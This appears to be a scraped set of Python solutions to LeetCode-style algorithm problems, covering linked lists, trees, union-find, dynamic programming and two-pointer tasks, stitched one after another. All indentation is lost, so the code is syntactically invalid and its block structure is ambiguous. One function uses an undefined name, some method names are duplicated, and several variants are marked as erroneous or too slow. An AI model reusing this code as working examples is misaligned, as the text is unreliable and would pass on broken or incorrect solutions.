if __name__ == "__main__":
assert Solution().minEatingSpeed([3,6,7,11], 8) == 4
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def middleNode(self, head: ListNode) -> ListNode:
l = 0
cur = head
while cur:
l += 1
cur = cur.next
mid = l // 2 + 1
cur_l = 0
cur = head
while cur:
cur_l += 1
if cur_l == mid:
return cur
cur = cur.next
return None
class Solution:
def decodeAtIndex(self, S: str, K: int) -> str:
l = 0
for s in S:
if s.isdigit():
l *= int(s)
else:
l += 1
for s in reversed(S):
K %= l
if K == 0 and s.isalpha():
return s
if s.isdigit():
l //= int(s)
else:
l -= 1
raise
def decodeAtIndex_error(self, S: str, K: int) -> str:
K -= 1
i = 0
j = 0
last = None
n = len(S)
while j < n:
if S[j].isdigit():
if not last:
last = j
d = int(S[j])
l = last - i
while K >= l and d > 0:
K -= l
d -= 1
if d > 0:
return S[i + K]
elif last:
i = j
last = None
j += 1
return S[i+K]
if __name__ == "__main__":
assert Solution().decodeAtIndex("ha22", 5) == "h"
from typing import List
from collections import deque
class Solution:
def numRescueBoats(self, people: List[int], limit: int) -> int:
ret = 0
q = deque(sorted(people))
while q:
tail = q.pop()
ret += 1
if q and q[0] + tail <= limit:
q.popleft()
return ret
from typing import List
from collections import Counter
class Solution:
def uncommonFromSentences(self, A: str, B: str) -> List[str]:
c = Counter(A.split()) + Counter(B.split())
ret = [
k
for k, v in c.items()
if v == 1
]
return ret
def uncommonFromSentences_complext(self, A: str, B: str) -> List[str]:
c_A, c_B = Counter(A.split()), Counter(B.split())
ret = []
for k, v in c_A.items():
if v == 1 and k not in c_B:
ret.append(k)
for k, v in c_B.items():
if v == 1 and k not in c_A:
ret.append(k)
return ret
def uncommonFromSentences_error(self, A: str, B: str) -> List[str]:
s_A, s_B = set(A.split()), set(B.split())
return list(
(s_A - s_B) | (s_B - s_A)
)
from typing import List
from collections import defaultdict
class Solution:
def possibleBipartition(self, N: int, dislikes: List[List[int]]) -> bool:
G = defaultdict(list)
for u, v in dislikes:
G[u].append(v)
G[v].append(u)
visited = {}
for u in range(1, N+1):
if u not in visited:
if not self.dfs(u, G, visited, 0):
return False
return True
def dfs(self, u, G, visited, color):
visited[u] = color
for nbr in G[u]:
if nbr in visited:
if visited[nbr] == color:
return False
else:
if not self.dfs(nbr, G, visited, color ^ 1):
return False
return True
from typing import List
import bisect
class Solution:
def fairCandySwap(self, A: List[int], B: List[int]) -> List[int]:
sum_A = sum(A)
sum_B = sum(B)
diff = (sum_B - sum_A) // 2
set_B = set(B)
for a in A:
if a + diff in set_B:
return [a, a + diff]
raise
def fairCandySwap_complex(self, A: List[int], B: List[int]) -> List[int]:
sum_A = sum(A)
sum_B = sum(B)
if sum_A > sum_B:
return self.fairCandySwap(B, A)[::-1]
A.sort()
B.sort()
diff = (sum_B - sum_A) // 2
for a in A:
i = bisect.bisect_left(B, a + diff)
if i < len(B) and B[i] == a + diff:
return [a, a + diff]
raise
from typing import List
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def constructFromPrePost(self, pre: List[int], post: List[int]) -> TreeNode:
stk = []
popped = None
j = 0
for e in pre:
stk.append(TreeNode(e))
while stk and stk[-1].val == post[j]:
popped = stk.pop()
j += 1
if stk:
if not stk[-1].left:
stk[-1].left = popped
else:
stk[-1].right = popped
assert j == len(post)
return popped
def constructFromPrePost_complex(self, pre: List[int], post: List[int]) -> TreeNode:
if not pre or not post:
return None
root = TreeNode(pre[0])
if len(pre) == 1:
return root
if pre[1] == post[-2]:
left = None
right = self.constructFromPrePost(pre[1:], post[:-1])
else:
l = 0
for a in post:
l += 1
if a == pre[1]:
break
else:
raise
left = self.constructFromPrePost(pre[1:1+l], post[:l])
right = self.constructFromPrePost(pre[1+l:], post[l:-1])
root.left = left
root.right = right
return root
from typing import List
class Solution:
def findAndReplacePattern(self, words: List[str], pattern: str) -> List[str]:
ret = []
for w in words:
if self.match(w, pattern):
ret.append(w)
return ret
def match(self, word, pattern):
if len(word) != len(pattern):
return False
m = {}
m_inv = {}
for i in range(len(word)):
if word[i] not in m and pattern[i] not in m_inv:
m[word[i]] = pattern[i]
m_inv[pattern[i]] = word[i]
elif word[i] not in m or m[word[i]] != pattern[i]:
return False
else:
return True
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.cache = {}
def allPossibleFBT(self, N: int) -> List[TreeNode]:
if N not in self.cache:
if N == 0:
ret = []
elif N == 1:
ret = [TreeNode(0)]
else:
ret = []
for i in range(N):
lefts = self.allPossibleFBT(i)
rights = self.allPossibleFBT(N-1-i)
if lefts and rights:
for left in lefts:
for right in rights:
node = TreeNode(0)
node.left = left
node.right = right
ret.append(node)
self.cache[N] = ret
return self.cache[N]
from typing import List
class Solution:
def isMonotonic(self, A: List[int]) -> bool:
mono = 0
for i in range(1, len(A)):
if mono == 0:
if A[i] > A[i-1]:
mono = 2
elif A[i] < A[i-1]:
mono = 1
else:
if A[i] > A[i-1] and mono == 1:
return False
elif A[i] < A[i-1] and mono == 2:
return False
else:
return True
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.prev = None
self.root = None
def increasingBST(self, root: TreeNode) -> TreeNode:
self.dfs(root)
return self.root
def dfs(self, node):
if not node:
return
self.dfs(node.left)
if not self.prev:
self.root = node
else:
self.prev.right = node
node.left = None
self.prev = node
self.dfs(node.right)
class Solution:
def subarrayBitwiseORs(self, A: List[int]) -> int:
ret = set()
cur = set()
for a in A:
cur = {a | e for e in cur} | {a}
ret |= cur
return len(ret)
from typing import List
class RLEIterator:
def __init__(self, A: List[int]):
self.cur_i = 0
self.cur_used = 0
self.A = A
def next(self, n: int) -> int:
run = self.cur_used + n
while self.cur_i < len(self.A) and run > self.A[self.cur_i]:
run -= self.A[self.cur_i]
self.cur_i += 2
if self.cur_i >= len(self.A):
return -1
self.cur_used = run
return self.A[self.cur_i + 1]
class StockSpanner:
def __init__(self):
self.stk = []
def next(self, price: int) -> int:
cur_span = 1
while self.stk and self.stk[-1][0] <= price:
_, span = self.stk.pop()
cur_span += span
self.stk.append((price, cur_span))
return cur_span
from typing import List
class Solution:
def sortArrayByParity(self, A: List[int]) -> List[int]:
closed = -1
for i in range(len(A)):
if A[i] % 2 == 0:
closed += 1
A[closed], A[i] = A[i], A[closed]
return A
from typing import List
MOD = 10 ** 9 + 7
class Solution:
def sumSubarrayMins(self, A: List[int]) -> int:
n = len(A)
L = [-1 for _ in A]
R = [n for _ in A]
stk = []
for i in range(n):
while stk and A[stk[-1]] >= A[i]:
stk.pop()
if stk:
L[i] = stk[-1]
stk.append(i)
stk = []
for i in range(n-1, -1, -1):
while stk and A[stk[-1]] > A[i]:
stk.pop()
if stk:
R[i] = stk[-1]
stk.append(i)
ret = 0
for i in range(n):
ret += (
A[i] * (i - L[i]) * (R[i] - i)
)
ret %= MOD
return ret
class Solution:
def sumSubarrayMins(self, A: List[int]) -> int:
stk = []
A = [-float('inf')] + A + [-float('inf')]
ret = 0
for i, a in enumerate(A):
while stk and A[stk[-1]] > a:
h = stk.pop()
ret += A[h] * (h - stk[-1]) * (i - h)
ret %= MOD
stk.append(i)
return ret
if __name__ == "__main__":
assert Solution().sumSubarrayMins([71,55,82,55]) == 593
assert Solution().sumSubarrayMins([3,1,2,4]) == 17
from typing import List
class Solution:
def smallestRangeI(self, A: List[int], K: int) -> int:
return max(0, max(A) - K - (min(A) + K))
from typing import List
class Solution:
def smallestRangeII(self, A: List[int], K: int) -> int:
A.sort()
mn = min(A)
mx = max(A)
ret = mx - mn
for i in range(len(A) - 1):
cur_mx = max(mx - K, A[i] + K)
cur_mn = min(mn + K, A[i+1] - K)
ret = min(ret, cur_mx - cur_mn)
return ret
def smallestRangeII_error(self, A: List[int], K: int) -> int:
mini = min(A)
maxa = max(A)
B = []
max_upper_diff = 0
max_lower_diff = 0
upper = max(mini + K, maxa - K)
lower = min(mini + K, maxa - K)
for a in A:
diffs = [(a + K) - upper, lower - (a - K)]
cur_diff = min(diffs)
if cur_diff == diffs[0] and cur_diff >= max_upper_diff:
max_upper_diff = cur_diff
elif cur_diff == diffs[1] and cur_diff >= max_lower_diff:
max_lower_diff = cur_diff
return upper + max_upper_diff - (lower + max_lower_diff)
from typing import List
from collections import defaultdict
import bisect
class TopVotedCandidate:
def __init__(self, persons: List[int], times: List[int]):
self.maxes = []
counter = defaultdict(int)
tp = sorted(zip(times, persons))
for t, p in tp:
counter[p] += 1
if not self.maxes or counter[self.maxes[-1][1]] <= counter[p]:
self.maxes.append((t, p))
def q(self, t: int) -> int:
i = bisect.bisect(self.maxes, (t, 0))
if i < len(self.maxes) and self.maxes[i][0] == t:
return self.maxes[i][1]
i -= 1
return self.maxes[i][1]
from typing import List
from collections import Counter
class Solution:
def hasGroupsSizeX(self, deck: List[int]) -> bool:
counter = Counter(deck)
gcd = None
for v in counter.values():
if gcd is None:
gcd = v
gcd = self.gcd(gcd, v)
if gcd == 1:
return False
return True
def gcd(self, a, b):
while b:
a, b = b, a % b
return a
from typing import List
class Solution:
def partitionDisjoint(self, A: List[int]) -> int:
n = len(A)
MX = [-float('inf') for _ in range(n+1)]
MI = [float('inf') for _ in range(n+1)]
for i in range(n):
MX[i+1] = max(M[i], A[i])
for i in range(n-1, -1, -1):
MI[i] = min(MI[i+1], A[i])
for l in range(1, n+1):
if MX[l] <= MI[l]:
return l
raise
def partitionDisjoint_2(self, A: List[int]) -> int:
MX = [0 for _ in A]
MI = [0 for _ in A]
MX[0] = A[0]
MI[-1] = A[-1]
n = len(A)
for i in range(1, n):
MX[i] = max(MX[i-1], A[i])
for i in range(n-2, -1, -1):
MI[i] = min(MI[i+1], A[i])
for i in range(n-1):
if MX[i] <= MI[i+1]:
return i
raise
from typing import List
from collections import Counter, defaultdict
class Solution:
def wordSubsets(self, A: List[str], B: List[str]) -> List[str]:
mx = defaultdict(int)
for b in B:
c = Counter(b)
for k, v in c.items():
mx[k] = max(mx[k], v)
ret = []
for a in A:
c = Counter(a)
for k, v in mx.items():
if c[k] < v:
break
else:
ret.append(a)
return ret
class Solution:
def reverseOnlyLetters(self, S: str) -> str:
lst = list(S)
i = 0
n = len(lst)
j = n - 1
while True:
while i < n and not lst[i].isalpha():
i += 1
while j >= 0 and not lst[j].isalpha():
j -= 1
if i < j and i < n and j >= 0:
lst[i], lst[j] = lst[j], lst[i]
i += 1
j -= 1
else:
break
return "".join(lst)
if __name__ == "__main__":
assert Solution().reverseOnlyLetters("Test1ng-Leet=code-Q!") == "Qedo1ct-eeLg=ntse-T!"
from typing import List
class Solution:
def maxSubarraySumCircular(self, A: List[int]) -> int:
ret1 = self.max_subarray(A)
ret2 = sum(A) + self.max_subarray([-a for a in A[1:-1]])
return max(ret1, ret2)
def max_subarray(self, A) -> int:
mx = -float('inf')
cur = 0
for a in A:
cur = a + max(cur, 0)
mx = max(mx, cur)
return mx
def maxSubarraySumCircular_error(self, A: List[int]) -> int:
cur = [0, None]
mx = -float('inf')
i = 0
j = 0
n = len(A)
while i < n:
cur[0] += A[i]
cur[1] = i
mx = max(mx, cur[0])
j = i + 1
while cur[0] >= 0 and j < i + n:
cur[0] += A[j % n]
mx = max(mx, cur[0])
j += 1
i = j
return mx
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from collections import deque
class CBTInserter:
def __init__(self, root: TreeNode):
self.candidates = deque()
self.root = root
q = [root]
while q:
cur_q = []
for e in q:
if e.left:
cur_q.append(e.left)
if e.right:
cur_q.append(e.right)
if not e.left or not e.right:
self.candidates.append(e)
q = cur_q
def insert(self, v: int) -> int:
pi = self.candidates[0]
node = TreeNode(v)
if not pi.left:
pi.left = node
else:
pi.right = node
if pi.left and pi.right:
self.candidates.popleft()
self.candidates.append(node)
return pi.val
def get_root(self) -> TreeNode:
return self.root
class Solution:
def minAddToMakeValid(self, S: str) -> int:
ret = 0
stk = []
for s in S:
if s == "(":
stk.append(s)
else:
if stk:
stk.pop()
else:
ret += 1
ret += len(stk)
return ret
from typing import List
class Solution:
def sortArrayByParityII(self, A: List[int]) -> List[int]:
even_idx = 0
for odd_idx in range(1, len(A), 2):
if A[odd_idx] % 2 == 0:
while A[even_idx] % 2 == 0:
even_idx += 2
A[odd_idx], A[even_idx] = A[even_idx], A[odd_idx]
return A
def sortArrayByParityII_complex(self, A: List[int]) -> List[int]:
closed = -1
n = len(A)
for i in range(n):
if A[i] % 2 == 0:
closed += 1
A[i], A[closed] = A[closed], A[i]
j = closed + 1
if j % 2 == 1:
j += 1
for i in range(1, closed + 1, 2):
A[i], A[j] = A[j], A[i]
j += 2
return A
if __name__ == "__main__":
assert Solution().sortArrayByParityII([4,1,1,0,1,0]) == [4,1,0,1,0,1]
from typing import List
from collections import defaultdict
MOD = 10 ** 9 + 7
class Solution:
def threeSumMulti(self, A: List[int], target: int) -> int:
counter = defaultdict(int)
for a in A:
counter[a] += 1
keys = list(counter.keys())
keys.sort()
n = len(keys)
ret = 0
for i in range(n):
j = i
k = n - 1
while j <= k:
a, b, c = keys[i], keys[j], keys[k]
if b + c < target - a:
j += 1
elif b + c > target - a:
k -= 1
else:
if a < b < c:
ret += counter[a] * counter[b] * counter[c]
elif a == b < c:
ret += counter[a] * (counter[a] - 1) // 2 * counter[c]
elif a < b == c:
ret += counter[a] * counter[b]  * (counter[b] - 1) // 2
elif a== b == c:
ret += counter[a] * (counter[a] - 1) * (counter[a] - 2) // (3 * 2)
else:
raise
ret %= MOD
j += 1
k -= 1
return ret
def threeSumMulti_TLE(self, A: List[int], target: int) -> int:
A.sort()
n = len(A)
ret = 0
for i in range(n):
j = i + 1
k = n - 1
while j < k:
if A[j] + A[k] < target - A[i]:
j += 1
elif A[j] + A[k] > target - A[i]:
k -= 1
else:
l_cnt = 1
while j + l_cnt < n and A[j + l_cnt] == A[j]:
l_cnt += 1
r_cnt = 1
while k - r_cnt >= 0 and A[k - r_cnt] == A[k]:
r_cnt += 1
if A[j] != A[k]:
ret += l_cnt * r_cnt
ret %= MOD
else:
ret += l_cnt * (l_cnt - 1) // 2
ret %= MOD
j += l_cnt
k -= r_cnt
return ret
def threeSumMulti_TLE(self, A: List[int], target: int) -> int:
n = len(A)
F = [[[0 for _ in range(3 + 1)] for _ in range(target + 1)] for _ in range(n+1)]
for i in range(n+1):
F[i][0][0] = 1
for i in range(1, n + 1):
for t in range(target + 1):
for k in range(1, 3 + 1):
F[i][t][k] = F[i-1][t][k] % MOD
if t - A[i-1] >= 0:
F[i][t][k] += F[i-1][t-A[i-1]][k-1] % MOD
print(F[n][target][3])
return F[n][target][3]
def threeSumMulti_TLE(self, A: List[int], target: int) -> int:
F = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))
n = len(A)
for i in range(n+1):
F[i][0][0] = 1
for i in range(1, n + 1):
for t in range(target + 1):
for k in range(1, 3 + 1):
F[i][t][k] = F[i-1][t][k] + F[i-1][t-A[i-1]][k-1]
F[i][t][k] %= MOD
return F[n][target][3]
if __name__ == "__main__":
assert Solution().threeSumMulti([1,1,2,2,3,3,4,4,5,5], 8) == 20
from typing import List
from collections import defaultdict
class DisjointSet:
def __init__(self):
self.pi = {}
def union(self, x, y):
pi_x = self.find(x)
pi_y = self.find(y)
self.pi[pi_x] = pi_y
def find(self, x):
if x not in self.pi:
self.pi[x] = x
if self.pi[x] != x:
self.pi[x] = self.find(self.pi[x])
return self.pi[x]
class Solution:
def minMalwareSpread(self, graph: List[List[int]], initial: List[int]) -> int:
ds = DisjointSet()
n = len(graph)
for i in range(n):
for j in range(n):
if graph[i][j] == 1:
ds.union(i, j)
counts = defaultdict(int)
for i in range(n):
counts[ds.find(i)] += 1
malware_counts = defaultdict(int)
for i in initial:
malware_counts[ds.find(i)] += 1
max_i = min(initial)
for i in initial:
pi = ds.find(i)
if malware_counts[pi] == 1:
max_count = counts[ds.find(max_i)]
if max_count < counts[pi]:
max_i = i
elif max_count == counts[pi] and max_i > i:
max_i = i
return max_i
if __name__ == "__main__":
assert Solution().minMalwareSpread([[1,1,0],[1,1,0],[0,0,1]], [0,1]) == 0
class Solution:
def isLongPressedName(self, name: str, typed: str) -> bool:
m, n = len(name), len(typed)
i, j = 0, 0
while i < m and j < n:
if name[i] == typed[j]:
i += 1
j += 1
elif j - 1 >= 0 and typed[j-1] == typed[j]:
j += 1
else:
return False
while j - 1 >= 0 and j < n and typed[j-1] == typed[j]:
j += 1
return i == m and j == n
class Solution:
def minFlipsMonoIncr(self, S: str) -> int:
n = len(S)
Z = [0 for _ in range(n+1)]
O = [0 for _ in range(n+1)]
for i in range(1, n+1):
O[i] = O[i-1]
if S[i-1] == "1":
O[i] += 1
for i in range(n-1, -1, -1):
Z[i] = Z[i+1]
if S[i] == "0":
Z[i] += 1
ret = float('inf')
for i in range(n):
ret = min(ret, O[i] + Z[i+1])
return ret
from typing import List
from collections import defaultdict
class DisjointSet:
def __init__(self):
self.pi = {}
def union(self, x, y):
self.pi[self.find(x)] = self.find(y)
def find(self, x):
if x not in self.pi:
self.pi[x] = x
if self.pi[x] != x:
self.pi[x] = self.find(self.pi[x])
return self.pi[x]
class Solution:
def minMalwareSpread(self, graph: List[List[int]], initial: List[int]) -> int:
n = len(graph)
initial_set = set(initial)
normal = [i for i in range(n) if i not in initial_set]
ds = DisjointSet()
for i in normal:
for j in normal:
if graph[i][j] == 1:
ds.union(i, j)
sizes = defaultdict(int)
for i in normal:
sizes[ds.find(i)] += 1
comp2malcount = defaultdict(int)
mal2comps = defaultdict(set)
for i in normal:
for j in initial:
if graph[i][j] == 1:
comp2malcount[ds.find(i)] += 1
mal2comps[j].add(ds.find(i))
idx = min(initial)
max_size = 0
for j in initial:
for comp in mal2comps[j]:
if comp2malcount[comp] == 1:
if sizes[comp] > max_size:
max_size = sizes[comp]
idx = j
elif sizes[comp] == max_size:
idx = min(idx, j)
return idx
from typing import List
class Solution:
def numUniqueEmails(self, emails: List[str]) -> int:
s = set()
for e in emails:
local, domain = e.split("@")
local = self.stem(local)
s.add((local, domain))
return len(s)
def stem(self, local):
return local.split("+")[0].replace(".", "")
from typing import List
class Solution:
def numSubarraysWithSum(self, A: List[int], S: int) -> int:
ret = 0
i_lo, i_hi, j = 0, 0, 0
sum_lo, sum_hi = 0, 0
for j in range(len(A)):
sum_lo += A[j]
sum_hi += A[j]
while i_lo < j and sum_lo > S:
sum_lo -= A[i_lo]
i_lo += 1
while i_hi < j and (sum_hi > S or sum_hi == S and A[i_hi] == 0):
sum_hi -= A[i_hi]
i_hi += 1
assert i_hi >= i_lo
if sum_lo == S:
assert sum_hi == S
ret += i_hi - i_lo + 1
return ret
def numSubarraysWithSum_error(self, A: List[int], S: int) -> int:
ret = 0
i = 0
j = 0
n = len(A)
cur_sum = 0
while j < n:
cur_sum += A[j]
if cur_sum < S and j < n:
j += 1
elif cur_sum == S:
ret += 1
while i <= j and A[i] == 0:
i += 1
ret += 1
j += 1
else:
while i <= j and cur_sum > S:
cur_sum -= A[i]
i += 1
if cur_sum == S:
ret += 1
while i <= j and A[i] == 0:
i += 1
ret += 1
j += 1
return ret
if __name__ == "__main__":
assert Solution().numSubarraysWithSum([1,0,1,0,1], 2) == 4
from typing import List
from collections import defaultdict
class Solution:
def minFallingPathSum(self, A: List[List[int]]) -> int:
m, n = len(A), len(A[0])
F = defaultdict(lambda: defaultdict(lambda: float("inf")))
for j in range(n):
F[m-1][j] = A[m-1][j]
for i in range(m-2, -1, -1):
for j in range(n):
F[i][j] = min(F[i+1][j-1], F[i+1][j], F[i+1][j+1]) + A[i][j]
return min(
F[0][j]
for j in range(n)
)
def minFallingPathSum_std(self, A: List[List[int]]) -> int:
m, n = len(A), len(A[0])
F = [[float('inf') for _ in range(n)] for _ in range(m)]
for j in range(n):
F[m-1][j] = A[m-1][j]
for i in range(m-2, -1, -1):
for j in range(n):
F[i][j] = min(F[i][j], F[i+1][j] + A[i][j])
if j - 1 >= 0:
F[i][j] = min(F[i][j], F[i+1][j-1] + A[i][j])
if j + 1 < n:
F[i][j] = min(F[i][j], F[i+1][j+1] + A[i][j])
return min(F[0])
if __name__ == "__main__":
assert Solution().minFallingPathSum([[1,2,3],[4,5,6],[7,8,9]]) == 12
from typing import List
dirs = ((0, -1), (0, 1), (-1, 0), (1, 0))
class Solution:
def shortestBridge(self, A: List[List[int]]) -> int:
m, n = len(A), len(A[0])
colors = [[None for _ in range(n)] for _ in range(m)]
color = 0
for i in range(m):
for j in range(n):
if A[i][j] == 1 and colors[i][j] is None:
self.dfs(A, i, j, colors, color)
color += 1
assert color == 2
step = 0
q = []
visited = [[False for _ in range(n)] for _ in range(m)]
for i in range(m):
for j in range(n):
if colors[i][j] == 0:
visited[i][j] = True
q.append((i, j))
while q:
cur_q = []
for i, j in q:
for I, J in self.nbr(A, i, j):
if not visited[I][J]:
if colors[I][J] == None:
visited[I][J] = True
cur_q.append((I, J))
elif colors[I][J] == 1:
return step
step += 1
q = cur_q
raise
def nbr(self, A, i, j):
m, n = len(A), len(A[0])
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n:
yield I, J
def dfs(self, A, i, j, colors, color):
colors[i][j] = color
for I, J in self.nbr(A, i, j):
if colors[I][J] is None and A[I][J] == 1:
self.dfs(A, I, J, colors, color)
if __name__ == "__main__":
assert Solution().shortestBridge([[1,1,1,1,1],[1,0,0,0,1],[1,0,1,0,1],[1,0,0,0,1],[1,1,1,1,1]]) == 1
MOD = 10 ** 9 + 7
dirs = [
(-2, 1),
(-1, 2),
(1, 2),
(2, 1),
(2, -1),
(1, -2),
(-1, -2),
(-2, -1),
]
nbrs = {
1: (6, 8),
2: (7, 9),
3: (4, 8),
4: (3, 9, 0),
5: tuple(),
6: (1, 7, 0),
7: (2, 6),
8: (1, 3),
9: (2, 4),
0: (4, 6),
}
from collections import defaultdict
class Solution:
def knightDialer(self, N: int) -> int:
F = defaultdict(lambda: defaultdict(int))
for pos in range(10):
F[pos][N-1] = 1
for n in range(N-2, -1, -1):
for pos in range(10):
for nbr in nbrs[pos]:
F[pos][n] += F[nbr][n+1]
F[pos][n] %= MOD
ret = 0
for i in range(10):
ret += F[i][0]
ret %= MOD
return ret
class SolutionTLE2:
def __init__(self):
self.cache = {}
def knightDialer(self, N: int) -> int:
ret = 0
for i in range(10):
ret += self.dfs(i, N-1)
ret %= MOD
return ret
def dfs(self, i, r):
if (i, r) not in self.cache:
ret = 0
if r == 0:
ret = 1
else:
for nbr in nbrs[i]:
ret += self.dfs(nbr, r-1)
self.cache[i, r] = ret
return self.cache[i, r]
class SolutionTLE:
def __init__(self):
self.m = 4
self.n = 3
self.cache = {}
def knightDialer(self, N: int) -> int:
ret = 0
for i in range(self.m):
for j in range(self.n):
if (i, j) != (3, 0) and (i, j) != (3, 2):
ret += self.dfs(i, j, N-1)
ret %= MOD
return ret
def dfs(self, i, j, r):
if (i, j, r) not in self.cache:
ret = 0
if r == 0:
ret = 1
else:
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < self.m and 0 <= J < self.n and (I, J) != (3, 0) and (I, J) != (3, 2):
ret += self.dfs(I, J, r - 1)
ret %= MOD
self.cache[i, j, r] = ret
return self.cache[i, j, r]
if __name__ == "__main__":
assert Solution().knightDialer(1) == 10
assert Solution().knightDialer(2) == 20
assert Solution().knightDialer(3) == 46
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = 0
def rangeSumBST(self, root: TreeNode, L: int, R: int) -> int:
self.dfs(root, L, R)
return self.ret
def dfs(self, node, L, R):
if not node:
return
if L <= node.val <= R:
self.ret += node.val
self.dfs(node.left, L, R)
self.dfs(node.right, L, R)
elif node.val > R:
self.dfs(node.left, L, R)
else:
self.dfs(node.right, L, R)
from typing import List
class Solution:
def validMountainArray(self, A: List[int]) -> bool:
incr = 0
for i in range(1, len(A)):
if A[i] == A[i-1]:
return False
elif A[i] > A[i-1]:
if incr == 2:
return False
incr = 1
else:
if incr == 0:
return False
incr = 2
return incr == 2
from typing import List
class Solution:
def diStringMatch(self, S: str) -> List[int]:
mini, maxa = 0, len(S)
ret = []
for c in S:
if c == "I":
ret.append(mini)
mini += 1
else:
ret.append(maxa)
maxa -= 1
ret.append(mini)
return ret
def diStringMatchErrror(self, S: str) -> List[int]:
ret = [0]
for c in S:
if c == "I":
ret.append(ret[-1] + 1)
else:
ret.append(ret[-1] -1)
mn = min(ret)
return [
e - mn
for e in ret
]
from typing import List
from collections import Counter
class Solution:
def minIncrementForUnique(self, A: List[int]) -> int:
if not A:
return 0
A.sort()
ret = 0
prev = A[0]
for i in range(1, len(A)):
target = prev + 1
if A[i] < target:
ret += target - A[i]
prev = target
else:
prev = A[i]
return ret
class Solution:
def minIncrementForUnique(self, A: List[int]) -> int:
counter = Counter(A)
q = []
ret = 0
for i in range(40000 * 2):
if counter[i] > 1:
q.extend([i] * (counter[i] - 1))
elif q and counter[i] == 0:
ret += i - q.pop()
return ret
class Solution:
def minIncrementForUnique(self, A: List[int]) -> int:
ret = 0
A.sort()
A.append(1 << 31 - 1)
demand = 0
supply = 0
for i in range(1, len(A)):
if A[i] == A[i-1]:
demand += 1
ret -= A[i-1]
else:
supply = min(demand, A[i] - A[i-1] - 1)
ret += (A[i-1] + 1 + A[i-1] + supply) * supply // 2
demand -= supply
return ret
from typing import List
class Solution:
def validateStackSequences(self, pushed: List[int], popped: List[int]) -> bool:
j = 0
n = len(pushed)
stk = []
for i in range(n):
stk.append(pushed[i])
while j < n and stk and stk[-1] == popped[j]:
stk.pop()
j += 1
return j == n
def validateStackSequences(self, pushed: List[int], popped: List[int]) -> bool:
i = 0
j = 0
stk = []
n = len(pushed)
while i < n and j < n:
while i < n and (not stk or stk[-1] != popped[j]):
stk.append(pushed[i])
i += 1
stk.pop()
j += 1
while j < n and stk and stk[-1] == popped[j]:
stk.pop()
j += 1
return not stk
from typing import List
from collections import defaultdict
class Solution:
def removeStones(self, stones: List[List[int]]) -> int:
G = defaultdict(list)
n = len(stones)
for i in range(n):
for j in range(i):
if stones[i][0] == stones[j][0] or stones[i][1] == stones[j][1]:
G[i].append(j)
G[j].append(i)
comp_cnt = 0
visited = [False for _ in range(n)]
for i in range(n):
if not visited[i]:
comp_cnt += 1
self.dfs(G, i, visited)
return n - comp_cnt
def dfs(self, G, i, visited):
visited[i] = True
for nbr in G[i]:
if not visited[nbr]:
self.dfs(G, nbr, visited)
if __name__ == "__main__":
assert Solution().removeStones([[0,0],[0,2],[1,1],[2,0],[2,2]]) == 3
from typing import List
from collections import deque
class Solution:
def deckRevealedIncreasing(self, deck: List[int]) -> List[int]:
q = deque()
deck.sort()
for i in range(len(deck) - 1, -1, -1):
if q:
tail = q.pop()
q.appendleft(tail)
q.appendleft(deck[i])
return list(q)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def flipEquiv(self, root1: TreeNode, root2: TreeNode) -> bool:
if not root1 and not root2:
return True
elif not root1 or not root2:
return False
if root1.val != root2.val:
return False
return self.flipEquiv(root1.left, root2.left) and self.flipEquiv(root1.right, root2.right) or \
self.flipEquiv(root1.left, root2.right) and self.flipEquiv(root1.right, root2.left)
from typing import List
class Solution:
def isAlienSorted(self, words: List[str], order: str) -> bool:
h = {}
for i, c in enumerate(order):
h[c] = i
for i in range(1, len(words)):
if self.cmp(words[i], words[i-1], h) == -1:
return False
return True
def cmp(self, w1, w2, h):
for c1, c2 in zip(w1, w2):
if h[c1] < h[c2]:
return -1
elif h[c1] > h[c2]:
return 1
if len(w1) == len(w2):
return 0
elif len(w1) > len(w2):
return 1
else:
return -1
if __name__ == "__main__":
assert Solution().isAlienSorted(["hello","leetcode"], "hlabcdefgijkmnopqrstuvwxyz") == True
from typing import List
from collections import Counter
class Solution:
def canReorderDoubled(self, A: List[int]) -> bool:
A.sort(key=abs)
counter = Counter(A)
for a in A:
if counter[a] == 0:
continue
if counter[2*a] == 0:
return False
counter[a] -= 1
counter[2*a] -= 1
return True
def canReorderDoubled_positive_negative(self, A: List[int]) -> bool:
A.sort()
counter = Counter(A)
for a in A:
if counter[a] == 0:
continue
counter[a] -= 1
if a > 0:
target = 2 * a
elif a % 2 != 0:
return False
else:
target = a // 2
if counter[target] > 0:
counter[target] -= 1
else:
return False
return True
if __name__ == "__main__":
assert Solution().canReorderDoubled([4,-2,2,-4]) == True
from typing import List
class Solution:
def minDeletionSize(self, A: List[str]) -> int:
m, n = len(A), len(A[0])
lt = [False for i in range(m)]
deleted = 0
for j in range(n):
for i in range(m-1):
if lt[i]:
continue
if A[i][j] > A[i+1][j]:
deleted += 1
break
else:
for i in range(m-1):
lt[i] = lt[i] or A[i][j] < A[i+1][j]
return deleted
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.max_depth = -float("inf")
self.expecting_partial = False
def isCompleteTree(self, root: TreeNode) -> bool:
return self.dfs(root, 0)
def dfs(self, node, d):
if not node:
if self.max_depth == -float("inf"):
self.max_depth = d - 1
return True
elif self.expecting_partial:
return d == self.max_depth
else:
if d == self.max_depth + 1:
return True
if d == self.max_depth:
self.expecting_partial = True
return True
return False
return self.dfs(node.left, d + 1) and self.dfs(node.right, d + 1)
from typing import List
class DisjointSet:
def __init__(self):
self.pi = {}
def union(self, x, y):
pi_x = self.find(x)
pi_y = self.find(y)
self.pi[pi_y] = pi_x
def find(self, x):
if x not in self.pi:
self.pi[x] = x
if self.pi[x] != x:
self.pi[x] = self.find(self.pi[x])
return self.pi[x]
class Solution:
def regionsBySlashes(self, grid: List[str]) -> int:
m, n = len(grid), len(grid[0])
ds = DisjointSet()
